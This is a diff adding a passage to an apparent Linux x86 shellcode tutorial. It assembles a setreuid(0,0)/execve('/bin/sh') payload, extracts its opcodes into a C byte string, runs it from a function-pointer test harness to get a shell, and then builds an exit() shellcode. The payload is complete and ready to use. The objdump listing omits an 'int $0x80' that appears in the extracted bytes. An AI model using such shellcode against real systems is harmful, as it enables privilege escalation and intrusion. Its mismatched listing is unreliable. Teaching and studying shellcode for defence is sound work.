@@ -162,3 +162,243 @@ To determine **address of string** we can make use of instructions using relativ
 
 <img src="images/image057.png" /><br />
 Figure 1: A trick to determine the address of string.
+
+If you are going to write code more complex than just spawning a simple shell, you can put more than one .string behind the CALL. Here, you know the size of those strings and can therefore calculate their relative locations once you know where the first string is located. With this knowledge, let’s try creating a simple shellcode that spawn a shell. The main points here are the similar process and steps that can be followed to create shellcodes. The following is a simple program example to spawn a shell in assembly (AT&T/Linux).
+
+```asm
+#assembly (AT&T/Linux) for spawning a shell
+####### testshell2.s ############
+
+.section .data
+.section .text
+.globl _start
+
+_start:
+         xor %eax, %eax            #clear register
+         mov $70, %al              #setreuid is syscall 70
+         xor %ebx, %ebx            #clear register, empty
+         xor %ecx, %ecx            #clear register, empty
+         int $0x80                 #interrupt 0x80
+
+         jmp ender
+
+starter:
+         popl %ebx                 #get the address of the string, in %ebx
+         xor  %eax, %eax           #clear register
+         mov  %al, 0x07(%ebx)      #put a NULL where the N is in the string
+         movl %ebx, 0x08(%ebx)     #put the address of the string to where the AAAA is
+         movl %eax, 0x0c(%ebx)     #put 4 null bytes into where the BBBB is
+         mov $11, %al              #execve is syscall 11
+         lea 0x08(%ebx), %ecx      #load the address of where the AAAA was
+         lea 0x0c(%ebx), %edx      #load the address of the NULLS
+         int $0x80                 #call the kernel
+
+ender:
+         call starter
+       .string "/bin/shNAAAABBBB" #16 bytes of string...
+```
+
+Basically, before the call starter the memory arrangement should be something like this (Little Endian):
+
+<img src="images/image058.png" /><br />
+Figure 2: Memory arrangement for our assembly code.
+
+When the starter: portion is executed the memory arrangement should be something like this:
+
+<img src="images/image059.png" /><br />
+Where:<br />
+a - Address of the string<br />
+Figure 3: Memory arrangement for our shellcode.
+
+Let compile and link the program and then disassemble it to get the equivalent hexadecimal opcodes.
+
+```
+[bodo@bakawali testbed8]$ as testshell2.s -o testshell2.o
+[bodo@bakawali testbed8]$ ld testshell2.o -o testshell2
+[bodo@bakawali testbed8]$ objdump -d testshell2
+
+testshell2:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048074 <_start>:
+8048074:       31 c0      xor     %eax, %eax
+8048076:       b0 46      mov     $0x46, %al
+8048078:       31 db      xor     %ebx, %ebx
+804807a:       31 c9      xor     %ecx, %ecx
+804807c:       eb 16      jmp     8048094 <ender>
+
+0804807e <starter>:
+804807e:       5b         pop     %ebx
+804807f:       31 c0      xor     %eax, %eax
+8048081:       88 43 07   mov     %al, 0x7(%ebx)
+8048084:       89 5b 08   mov     %ebx, 0x8(%ebx)
+8048087:       89 43 0c   mov     %eax, 0xc(%ebx)
+804808a:       b0 0b      mov     $0xb, %al
+804808c:       8d 4b 08   lea     0x8(%ebx), %ecx
+804808f:       8d 53 0c   lea     0xc(%ebx), %edx
+8048092:       cd 80      int     $0x80
+
+08048094 <ender>:
+8048094:       e8 e5 ff ff ff    call   804807e <starter>
+8048099:       2f                das
+804809a:       62 69 6e          bound  %ebp, 0x6e(%ecx)
+804809d:       2f                das
+804809e:       73 68             jae    8048108 <ender+0x74>
+80480a0:       4e                dec    %esi
+80480a1:       41                inc    %ecx
+80480a2:       41                inc    %ecx
+80480a3:       41                inc    %ecx
+80480a4:       41                inc    %ecx
+80480a5:       42                inc    %edx
+80480a6:       42                inc    %edx
+80480a7:       42                inc    %edx
+80480a8:       42                inc    %edx
+```
+
+Next, arrange the hexadecimal opcodes in char type array (C string).
+
+```c
+char code[ ] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
+               "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
+               "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
+               "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
+               "\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42";
+```
+
+Finally insert the shellcode into our test program, compile and run.
+
+```c
+/*test.c*/
+#include <unistd.h>
+
+char code[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
+              "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
+              "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
+              "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
+              "\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42";
+
+int main(int argc, char **argv)
+{
+    /*creating a function pointer*/
+    int (*func)();
+    func = (int (*)()) code;
+    (int)(*func)();
+}
+```
+
+```
+[bodo@bakawali testbed8]$ gcc -g test.c -o test
+[bodo@bakawali testbed8]$ execstack -s test
+[bodo@bakawali testbed8]$ ./test
+sh-3.00$
+```
+
+Well it works. Now, let try another example by using a simple C program. In this example we are using system call for exit(0), that is exit with no error and the program is shown below.
+
+```c
+/* exit.c */
+#include <unistd.h>
+
+int main()
+{
+    exit(0);
+}
+```
+
+Do some verification.
+
+```
+[bodo@bakawali testbed7]$ gcc -g exit.c -o exit
+[bodo@bakawali testbed7]$ execstack -s exit
+[bodo@bakawali testbed7]$ ./exit
+[bodo@bakawali testbed7]$ echo $?
+0
+[bodo@bakawali testbed7]$
+```
+
+Another verification.
+
+
+```c
+/* exit.c */
+#include <unistd.h>
+
+int main()
+{
+    exit(1);
+}
+```
+
+```
+[bodo@bakawali testbed7]$ gcc -g exit.c -o exit
+[bodo@bakawali testbed7]$ execstack -s exit
+[bodo@bakawali testbed7]$ ./exit
+[bodo@bakawali testbed7]$ echo $?
+1
+```
+
+The first thing we need to know is the [Linux system call](http://www.die.net/doc/linux/man/man2/syscalls.2.html) for [exit()](http://www.die.net/doc/linux/man/man2/exit.2.html) and that can be found in unistd.h. System call is the services provided by Linux kernel and just like API’s in Windows, you call them with different arguments. In C programming, it often uses functions defined in libc which provides a wrapper for many system calls. Linux manual page of section 2 provides more information about system calls. To get an overview, try using “man 2” at the command shell. It is also possible to invoke syscall() function directly. Each system call has a **function number** defined in <syscall.h> or <unistd.h>. Internally, system call is invoked by software interrupt **0x80** to transfer control to the kernel. System call table is defined in Linux kernel source file “arch/i386/kernel/entry.S ”.
+
+For our example we need just one system call and that is exit() (terminate the current process and exit with exit code) and its system call number is 1 and the argument is 0, (0 means the program exit normally, non-zero means program exit with an error).  They will be stored in eax, ebx registers respectively.  With this knowledge, let create the program in assembly.
+
+```asm
+######testshell.s#######
+#assembly code for exit() system call, AT&T/Linux
+
+.section .data
+.section .text
+
+.globl _start
+
+    jmp dummy
+
+_start:
+
+    popl %ebx            #gets the "X" address
+    xor %eax, %eax       #clear the eax register
+    mov %eax, 0x01(%ebx) #move NULL to the end of the "X"
+    mov $1, %eax         #move 1 into %eax
+    mov $0, %ebx         #move 0 into %ebx
+    int $0x80            #interupt 0x80
+dummy:
+    call _start
+    .string "X"
+```
+
+Then compile and link this assembly program and next, disassemble the executable.
+
+```
+[bodo@bakawali testbed7]$ as testshell.s -o testshell.o
+[bodo@bakawali testbed7]$ ld testshell.o -o testshell
+[bodo@bakawali testbed7]$ objdump -d testshell
+
+testshell:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048074 <_start-0x2>:
+ 8048074:       eb 12             jmp    8048088 <dummy>
+
+
+08048076 <_start>:
+ 8048076:       5b                pop    %ebx
+ 8048077:       31 c0             xor    %eax, %eax
+ 8048079:       89 43 01          mov    %eax, 0x1(%ebx)
+ 804807c:       b8 01 00 00 00    mov    $0x1, %eax
+ 8048081:       bb 00 00 00 00    mov    $0x0, %ebx
+ 8048086:       cd 80             int    $0x80
+
+
+08048088 <dummy>:
+ 8048088:       e8 e9 ff ff ff    call   8048076 <_start>
+ 804808d:       58                pop    %eax
+ ...
+```
+
+Extract the shellcode; rearrange the hex in char string format.  And each set of hexadecimal value represents our assembly instruction.  Using hexadecimal values we can put any ASCII value in the range of 0-255 in one byte.
+
+```
+\xeb\x12\x5b\x31\xc0\x89\x43\x01\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd
+\x80\xe8\xe9\xff\xff\xff\x58
+```
